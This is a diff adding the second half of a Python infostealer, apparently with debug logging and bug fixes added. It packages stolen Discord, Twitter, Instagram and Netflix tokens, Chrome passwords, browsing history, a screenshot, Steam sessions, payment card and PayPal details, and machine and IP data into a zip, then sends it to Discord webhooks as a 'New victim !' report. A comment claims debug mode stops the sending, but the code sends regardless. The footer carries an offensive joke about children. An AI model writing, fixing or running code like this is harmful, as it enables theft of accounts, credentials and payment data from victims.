+            chrome_Psw_t.add_row(__t)
+        for t_ in main_info[0]:
+            try:
+                if DEBUG_MODE:
+                    print(f"DEBUG: Getting user data for token: {t_[:10]}...")
+                lst = get_user_data(t_)
+                username, email, phone = f"{lst[0]}#{lst[1]}", lst[2], lst[3]
+                discord_T.add_row([t_, username, email, phone])
+                verified_tokens.append(t_)
+                if DEBUG_MODE:
+                    print(f"DEBUG: Successfully verified token for user: {username}")
+            except BaseException as e:
+                if DEBUG_MODE:
+                    print(f"DEBUG: Failed to get user data for token: {t_[:10]}..., error: {str(e)}")
+                pass
+        for _t in main_info[1]:
+            twitter_T.add_row([_t])
+        for _t_ in main_info[2]:
+            insta_T.add_row(_t_)
+        pay_l = []
+        for _p in main_info[3]:
+            if _p[1] == 1:
+                payment_card = PrettyTable(padding_width=1)
+                payment_card.field_names = [
+                    "Brand",
+                    "Last 4",
+                    "Type",
+                    "Expiration",
+                    "Billing Adress",
+                ]
+                payment_card.add_row(
+                    [_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]]
+                )
+                pay_l.append(payment_card.get_string())
+                if DEBUG_MODE:
+                    print(f"DEBUG: Found payment card: {_p[0]}, last 4: {_p[2]}")
+            elif _p[1] == 2:
+                payment_p = PrettyTable(padding_width=1)
+                payment_p.field_names = ["Email", "Type", "Billing Adress"]
+                payment_p.add_row([_p[0], "Paypal", _p[2]])
+                pay_l.append(payment_p.get_string())
+                if DEBUG_MODE:
+                    print(f"DEBUG: Found PayPal: {_p[0]}")
+        files_names = [
+            [os.path.join(td, "Discord Tokens.txt"), discord_T],
+            [os.path.join(td, "Twitter Tokens.txt"), twitter_T],
+            [os.path.join(td, "Instagram Tokens.txt"), insta_T],
+            [os.path.join(td, "Chrome Pass.txt"), chrome_Psw_t],
+        ]
+        for x_, y_ in files_names:
+            if (
+                (y_ == files_names[0][1] and len(main_info[0]) != 0)
+                or (y_ == files_names[1][1] and len(main_info[1]) != 0)
+                or (y_ == files_names[2][1] and len(main_info[2]) != 0)
+                or (y_ == files_names[3][1] and len(main_info[4]) != 0)
+            ):
+                with open(x_, "w") as wr:
+                    wr.write(y_.get_string())
+                if DEBUG_MODE:
+                    print(f"DEBUG: Created file: {x_}")
+        all_files = [
+            os.path.join(td, "History.txt"),
+            screenshot_path,
+            os.path.join(td, "Payment Info.txt"),
+        ]
+        for n in main_info[5]:
+            p = os.path.join(td, f"netflix_{main_info[5].index(n)}.json")
+            with open(p, "w") as f:
+                f.write(dumps(n, indent=4))
+            all_files.append(p)
+            if DEBUG_MODE:
+                print(f"DEBUG: Created Netflix file: {p}")
+        with open(all_files[0], "w") as f:
+            f.write(find_His())
+            if DEBUG_MODE:
+                print(f"DEBUG: Created history file: {all_files[0]}")
+        
+        # Get Steam session data
+        if DEBUG_MODE:
+            print("DEBUG: Attempting to collect Steam session data")
+        steam_zip_path = steam_st()
+        if steam_zip_path and os.path.exists(steam_zip_path):
+            all_files.append(steam_zip_path)
+            if DEBUG_MODE:
+                print(f"DEBUG: Added Steam session zip to files: {steam_zip_path}")
+            
+        with ZipFile(
+            os.path.join(td, "data.zip"), mode="w", compression=ZIP_DEFLATED
+        ) as zip:
+            if DEBUG_MODE:
+                print(f"DEBUG: Creating data zip at: {os.path.join(td, 'data.zip')}")
+            # Fix the logical error in the condition
+            has_payment_info = False
+            if 'payment_card' in locals() or 'payment_p' in locals():
+                has_payment_info = True
+                with open(all_files[2], "w") as f:
+                    for i in pay_l:
+                        f.write(f"{i}\n")
+                if DEBUG_MODE:
+                    print(f"DEBUG: Created payment info file: {all_files[2]}")
+                        
+            for files_path in all_files:
+                try:
+                    if os.path.exists(files_path):
+                        zip.write(files_path)
+                        if DEBUG_MODE:
+                            print(f"DEBUG: Added to zip: {files_path}")
+                except Exception as e:
+                    if DEBUG_MODE:
+                        print(f"DEBUG: Failed to add file to zip: {files_path}, error: {str(e)}")
+                    pass
+                    
+            for name_f, _ in files_names:
+                if os.path.exists(name_f):
+                    zip.write(name_f)
+                    if DEBUG_MODE:
+                        print(f"DEBUG: Added to zip: {name_f}")
+        
+        # Use webhooks from the parameter instead of undefined DISCORD_WEBHOOK_URLs
+        for URL in webhooks:
+            try:
+                if DEBUG_MODE:
+                    print(f"DEBUG: Preparing webhook for URL: {URL[:30]}...")
+                webhook = DiscordWebhook(
+                    url=URL,
+                    username="bleeding wd-40",
+                    avatar_url="https://cdn.discordapp.com/avatars/950643423768084480/e2b6154087ff4ab662e32977fd1184bf.png?size=1024&width=640&height=640",
+                )
+                embed = DiscordEmbed(title="New victim !", color="FFA500")
+                embed.add_embed_field(
+                    name="SYSTEM USER INFO",
+                    value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n",
+                    inline=False,
+                )
+                
+                # Add error handling for IP info
+                try:
+                    country_flag = ""
+                    if p_lst and len(p_lst) > 1 and p_lst[1]:
+                        try:
+                            if DEBUG_MODE:
+                                print(f"DEBUG: Getting country flag for: {p_lst[1]}")
+                            country_data = get(f'https://restcountries.com/v3/name/{p_lst[1]}').json()
+                            if country_data and isinstance(country_data, list) and len(country_data) > 0:
+                                country_flag = f":flag_{country_data[0]['cca2'].lower()}:"
+                                if DEBUG_MODE:
+                                    print(f"DEBUG: Found country flag: {country_flag}")
+                        except Exception as e:
+                            if DEBUG_MODE:
+                                print(f"DEBUG: Error getting country flag: {str(e)}")
+                            country_flag = ""
+                            
+                    ip_value = f":eyes:`IP:` **{p_lst[0] if p_lst and len(p_lst) > 0 else 'Unknown'}**\n"
+                    ip_value += f":golf:`Country:` **{p_lst[1] if p_lst and len(p_lst) > 1 else 'Unknown'}** {country_flag}\n"
+                    ip_value += f":cityscape:`City:` **{p_lst[2] if p_lst and len(p_lst) > 2 else 'Unknown'}**\n"
+                    ip_value += f":shield:`MAC:` **{gma() or 'Unknown'}**\n"
+                    ip_value += f":wrench:`HWID:` **{get_hwid() or 'Unknown'}**\n"
+                    
+                    embed.add_embed_field(
+                        name="IP USER INFO",
+                        value=ip_value,
+                        inline=False,
+                    )
+                    if DEBUG_MODE:
+                        print("DEBUG: Added IP info to embed")
+                except Exception as e:
+                    if DEBUG_MODE:
+                        print(f"DEBUG: Error adding IP info: {str(e)}")
+                    embed.add_embed_field(
+                        name="IP USER INFO",
+                        value="Error retrieving IP information",
+                        inline=False,
+                    )
+                
+                # Add error handling for component info
+                try:
+                    cpuinfo = get_cpu_info()
+                    cpu_info = cpuinfo.get('brand_raw', 'Unknown')
+                    cpu_speed = 'Unknown'
+                    if 'hz_advertised_friendly' in cpuinfo:
+                        try:
+                            cpu_speed = f"{round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz"
+                        except Exception as e:
+                            if DEBUG_MODE:
+                                print(f"DEBUG: Error parsing CPU speed: {str(e)}")
+                            cpu_speed = 'Unknown'
+                            
+                    ram_size = 'Unknown'
+                    try:
+                        ram_size = f"{round(virtual_memory().total / (1024.0 ** 3), 2)} GB"
+                    except Exception as e:
+                        if DEBUG_MODE:
+                            print(f"DEBUG: Error getting RAM size: {str(e)}")
+                        pass
+                        
+                    embed.add_embed_field(
+                        name="PC USER COMPONENT",
+                        value=f":satellite_orbital:`CPU:` **{cpu_info} - {cpu_speed}**\n:nut_and_bolt:`RAM:` **{ram_size}**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n",
+                        inline=False,
+                    )
+                    if DEBUG_MODE:
+                        print("DEBUG: Added component info to embed")
+                except Exception as e:
+                    if DEBUG_MODE:
+                        print(f"DEBUG: Error adding component info: {str(e)}")
+                    embed.add_embed_field(
+                        name="PC USER COMPONENT",
+                        value="Error retrieving component information",
+                        inline=False,
+                    )
+                
+                embed.add_embed_field(
+                    name="ACCOUNT GRABBED",
+                    value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n:green_circle:`Netflix:` **{len(main_info[5])}**\n:brown_circle:`Account Password Grabbed:` **{len(main_info[4])}**\n:video_game:`Steam Session:` **{'Yes' if steam_zip_path else 'No'}**\n",
+                    inline=False,
+                )
+                
+                card_e, paypal_e = (
+                    ":white_check_mark:" if "payment_card" in locals() else ":x:",
+                    ":white_check_mark:" if "payment_p" in locals() else ":x:",
+                )
+                embed.add_embed_field(
+                    name="PAYMENT INFO FOUNDED",
+                    value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}",
+                    inline=False,
+                )
+                embed.set_footer(text="i like kids")
+                embed.set_timestamp()
+                
+                zip_path = os.path.join(td, "data.zip")
+                if os.path.exists(zip_path):
+                    with open(zip_path, "rb") as f:
+                        webhook.add_file(
+                            file=f.read(),
+                            filename=f"wd40-{os.getenv('UserName')}.zip",
+                        )
+                    if DEBUG_MODE:
+                        print(f"DEBUG: Added zip file to webhook: {zip_path}")
+                
+                webhook.add_embed(embed)
+                
+                # Always execute the webhook regardless of DEBUG_MODE
+                response = webhook.execute()
+                if DEBUG_MODE:
+                    print(f"DEBUG: Webhook executed with response: {response}")
+                    print(f"DEBUG: Sent to: {URL}")
+            except Exception as e:
+                if DEBUG_MODE:
+                    print(f"DEBUG: Error sending webhook: {str(e)}")
+                pass
+            
+        # Clean up Steam zip if it exists
+        if steam_zip_path and os.path.exists(steam_zip_path):
+            try:
+                os.remove(steam_zip_path)
+                if DEBUG_MODE:
+                    print(f"DEBUG: Removed temporary Steam zip: {steam_zip_path}")
+            except Exception as e:
+                if DEBUG_MODE:
+                    print(f"DEBUG: Error removing Steam zip: {str(e)}")
+                pass
+    
+    # Send tokens to webhook
+    try:
+        if DEBUG_MODE:
+            print("DEBUG: Calling find_tokens function")
+        find_tokens()
+    except Exception as e:
+        if DEBUG_MODE:
+            print(f"DEBUG: Error in find_tokens: {str(e)}")
+        pass
+
+
+if __name__ == "__main__":
+    # This is the entry point of the script when executed directly
+    # freeze_support() allows the code to run properly when frozen into an executable
+    # by handling multiprocessing initialization in frozen environments
+    freeze_support()
+    
+
+    # Enable debug mode to print detailed logs about the execution
+    # When DEBUG_MODE is True, the program will output detailed information
+    # about what it's doing but won't actually send data to Discord webhooks
+    try:
+        # Use the log_debug function for better formatted debug output
+        log_debug("Starting main execution", "INFO")
+        if len(sys.argv) == 1:
+            try:
+                log_debug("No arguments provided, using default webhook", "INFO")
+                send_webhook([wbhk])
+            except NameError:
+                # DEBUG_MODE is already defined at the top of the file
+                log_debug("No arguments provided, using default webhook", "INFO")
+                send_webhook([wbhk])
+        else:
+            try:
+                log_debug(f"Using {len(sys.argv)-1} webhooks from arguments", "INFO")
+                webhooks = sys.argv[1:]  # Get all arguments except the first one
+                send_webhook(webhooks)
+            except NameError:
+                # DEBUG_MODE is already defined at the top of the file
+                webhooks = sys.argv[1:]  # Get all arguments except the first one
+                send_webhook(webhooks)
+    except Exception as e:
+        try:
+            log_debug(f"Error in main execution: {str(e)}", "ERROR")
+        except:
+            print(f"Error in main execution: {str(e)}")
